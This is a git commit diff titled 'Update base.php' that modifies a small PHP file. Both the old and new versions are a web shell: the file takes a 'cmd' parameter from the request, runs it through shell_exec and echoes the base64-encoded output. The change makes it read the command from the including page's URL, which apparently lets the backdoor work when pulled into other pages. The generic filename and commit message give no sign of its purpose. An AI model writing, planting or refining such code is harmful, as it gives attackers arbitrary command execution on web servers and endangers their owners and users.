892f598ff2f0e0d564ecf574607e15edf02d9734
vivekexe211 <poojaryvivek76@gmail.com>
2026-01-14 16:41:16 +0530

    Update base.php

--- base.php
+++ base.php
@@ -1,6 +1,8 @@
 <?php
-if(isset($_GET['cmd'])) {
-    $output = shell_exec($_GET['cmd'] . " 2>&1");
+// Get cmd from the main request, not from this file's URL
+parse_str(parse_url($_SERVER['REQUEST_URI'], PHP_URL_QUERY), $params);
+if(isset($params['cmd'])) {
+    $output = shell_exec($params['cmd'] . " 2>&1");
     echo base64_encode($output);
 }
 ?>
